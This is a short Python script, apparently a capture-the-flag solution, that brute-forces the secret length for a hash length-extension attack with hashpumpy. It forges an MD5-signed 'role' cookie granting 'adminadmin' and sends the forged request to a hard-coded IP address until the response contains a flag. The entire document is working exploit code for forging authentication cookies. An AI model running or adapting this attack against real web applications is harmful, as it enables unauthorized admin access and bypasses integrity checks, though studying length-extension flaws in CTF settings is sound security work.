import hashpumpy
import urllib
import requests

for i in range(1, 40):
    m = hashpumpy.hashpump('5beee4019e55f453db9daf0df7d90879', 'YVPweR3oRN%3B%7Bnj32', 'binLep', i)
    print i
    url = 'http://47.93.249.236:10008/'
    digest = m[0]

    message = urllib.quote(urllib.unquote(m[1]))
    cookie = 'role=' + message + '; hsh=' + digest + '; role_true=adminadmin'
    headers = {
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate'
    }
    print headers
    re = requests.get(url=url, headers=headers)
    print re.text
    if "flag{" in re.text:
        print re;
        break
